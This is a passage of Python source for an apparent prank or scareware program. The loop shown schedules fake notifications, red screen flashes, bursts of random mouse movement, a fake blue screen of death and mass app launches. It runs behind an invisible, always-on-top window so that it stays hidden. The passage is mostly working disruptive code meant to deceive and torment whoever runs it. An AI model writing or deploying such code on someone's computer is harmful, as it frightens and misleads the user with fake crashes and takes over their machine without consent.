            last_msgbox = time.time()

        # ── Fake notification every 18-35s
        if elapsed > 10 and time.time() - last_notif > random.uniform(18, 35):
            fake_notification()
            last_notif = time.time()

        # ── Screen red flash every 45-75s
        if elapsed > 30 and time.time() - last_flash > random.uniform(45, 75):
            screen_flash()
            last_flash = time.time()

        # ── Mouse chaos burst every 120-180s
        if elapsed > 60 and time.time() - last_mouse > random.uniform(120, 180):
            threading.Thread(target=mouse_chaos_burst, daemon=True).start()
            last_mouse = time.time()

        # ── Fake BSOD: first time after 2min, then every 5-8min
        bsod_interval = 120 if not bsod_done[0] else random.uniform(300, 480)
        if elapsed > 90 and time.time() - last_bsod > bsod_interval:
            fake_bsod()
            bsod_done[0] = True
            last_bsod = time.time()

        # ── App spam blast every 3-6 min
        if elapsed > 120 and time.time() - last_spam > random.uniform(180, 360):
            threading.Thread(target=spam_launch, daemon=True).start()
            last_spam = time.time()

threading.Thread(target=chaos_loop, daemon=True).start()

# ── Invisible root ────────────────────────────────────────────────────────────
root = tk.Tk()
root.withdraw()
root.attributes("-topmost", True)
root.mainloop()
